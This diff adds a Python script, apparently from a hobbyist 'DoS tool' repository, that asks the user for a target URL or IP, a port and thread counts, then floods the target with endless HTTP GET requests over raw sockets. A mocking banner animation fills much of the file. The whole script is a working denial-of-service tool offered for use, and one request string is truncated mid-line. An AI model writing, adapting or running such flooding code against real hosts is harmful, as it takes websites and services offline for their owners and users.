@@ -1,0 +1,107 @@
+import sys
+import os
+import random
+import socket
+import time
+from threading import Thread
+
+os.system('clear')
+
+print("""
+                Fast Http Denail Of Service Python3 Script
+                Code By : GogoZin
+        [Warning][!][Don't][Attack][Any][Gov][Websites][Please]
+""")
+
+url = str(input("Target's Url Or Ip ~/"))
+port = int(input("Target's Port ~/"))
+thr = int(input("Set Your Threads ~/"))
+pow = int(input("Set Your CPU Power ~/"))
+
+def http():
+        request = "GET / HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safa$
+        tar = (url,port)
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect(tar)
+                        s.send(str.encode(request))
+                        print("[*]Sucess Sent Http Requests To  ---> " + str(url) + ":" + str(port))
+                        try:
+                                for y in range(pow):
+                                        s.send(str.encode(request))
+                                        print("[*]Threads Sent Http Requests To ---> " + str(url) + ":" + str(port))
+                        except:
+                                print("[!]Sockets Error...Server Maybe Down")
+                                s.close()
+                except:
+                        print("[!]System Get Some Wrong...Restart Script Again")
+                        sys.exit()
+
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[\]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[|]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[/]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[\]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[|]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[/]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[\]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[|]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[/]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[\]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[|]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[/]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[\]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[|]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[/]Fuck You Damn Noob Skid")
+time.sleep(0.5)
+os.system('clear')
+print("[-]Fuck You Damn Noob Skid")
+time.sleep(1)
+os.system('clear')
+for i in range(thr):
+        i = Thread(target=http, name=(i))
+        i.start()
